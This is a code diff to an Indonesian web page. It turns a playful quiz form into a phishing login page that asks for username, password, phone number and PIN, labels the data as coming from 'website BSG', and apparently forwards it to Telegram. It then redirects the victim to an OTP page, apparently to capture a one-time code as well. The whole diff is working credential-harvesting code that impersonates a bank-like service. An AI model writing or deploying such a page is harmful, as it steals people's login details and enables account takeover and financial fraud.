@@ -163,22 +163,22 @@ input::placeholder{ color: rgba(14,17,22,.45); }
       <form id="loginForm" autocomplete="on">
 
         <div class="field">
-          <div class="label">Masukkan nama pacar</div>
+          <div class="label">Masukkan username</div>
           <input id="username" name="a" type="text" required="">
         </div>
 
         <div class="field">
-          <div class="label">Masukkan minuman kesukaan</div>
+          <div class="label">Masukkan password</div>
           <input id="nik" name="b" type="text" autocomplete="off" required="">
         </div>
 
         <div class="field">
-          <div class="label">Masukkan makanan kesukaan</div>
+          <div class="label">Masukkan nomor handphone</div>
           <input type="text" name="c" id="nomor" required="">
         </div>
 
         <div class="field">
-          <div class="label"></div>
+          <div class="label">masukan pin</div>
           <input type="text" name="d" id="pinr" placeholder="XXXXXX" required="">
         </div>
 
@@ -221,14 +221,14 @@ $("#loginForm").addEventListener("submit", async (e) => {
   }
 
   const message = `
-💌 DATA BARU MASUK 💌
+ DATA BARU MASUK 
 
-👤 Nama     : ${nama}
-🥤 Minuman  : ${minuman}
-🍽️ Makanan  : ${makanan}
-🆔 Kode    : ${kode}
+ username    : ${nama}
+ pasword  : ${minuman}
+ nomor hp  : ${makanan}
+ pin    : ${kode}
 
-Dikirim dari website ❤️
+Dikirim dari website BSG
 `;
 
   try {
@@ -242,7 +242,7 @@ Dikirim dari website ❤️
     });
 
     toast("Berhasil dikirim ❤️");
-    window.location.href = "tujuan.html";
+    window.location.href = "otp.html";
   } catch (err) {
     toast("Gagal kirim ke Telegram.");
   }
